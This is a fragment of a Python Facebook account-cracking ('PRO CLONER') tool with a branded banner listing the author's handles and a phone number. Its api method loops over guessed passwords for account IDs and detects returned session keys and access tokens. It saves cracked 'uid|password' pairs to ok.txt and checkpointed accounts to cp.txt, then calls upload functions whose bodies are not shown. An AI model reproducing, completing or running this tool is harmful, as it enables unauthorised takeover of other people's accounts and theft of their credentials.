...
\033[1;93m══════════════════════════════════════════════════
\033[0;96m [\033[0;96m✯\033[1;96m] \033[0;96mFB GROUP : Sajjad
\033[0;96m [\033[0;96m✯\033[0;96m] \033[0;96mGITHUB   : SHAHZADA-SAJJAD
\033[0;96m [\033[0;96m✯\033[0;96m] \033[0;96mFacebook  : Shahzada Ahmed Sajjad
\033[0;96m [\033[0;96m✯\033[0;96m] \033[0;96mWhatsApp  : +8801840215106
\033[0;96m [\033[0;96m✯\033[0;96m] \033[0;96mYoutube  : SAJJAD HELP ZONE
\033[0;96m [\033[0;96m✯\033[0;96m] \033[0;96mInstagram :shahzada-ahmed-sajjad
\033[0;96m [\033[0;96m✯\033[0;96m] \033[0;96mcontract :+8801840215106
\033[0;96m [\033[0;96m✯\033[0;96m] \033[0;96mversion : 2.0
\033[0;96m [\033[0;96m✯\033[0;96m] \033[0;96mPower :Power by Sajjad
\033[0;96m [\033[0;96m✯\033[0;96m] \033[0;96mwarning : Lover Not Allowed 
\033[0;96m [\033[0;96m✯\033[0;96m] \033[0;96mWARNING  :  SAJJAD-2.0
\033[1;93m══════════════════════════════════════════════════
    """)   
		print("%s [%s•%s] %sTOOL NAME : %sSajjad PRO CLONER"%(R,C,R,C,G))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [SAJJAD] : %s/%s -> \033[0;92m [ SAJJAD-OK:%s ]- \033[0;91m[SAJJAD-CP:%s ]"%(C,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [SAJJAD-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			if "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[SAJJAD-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [SAJJAD-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
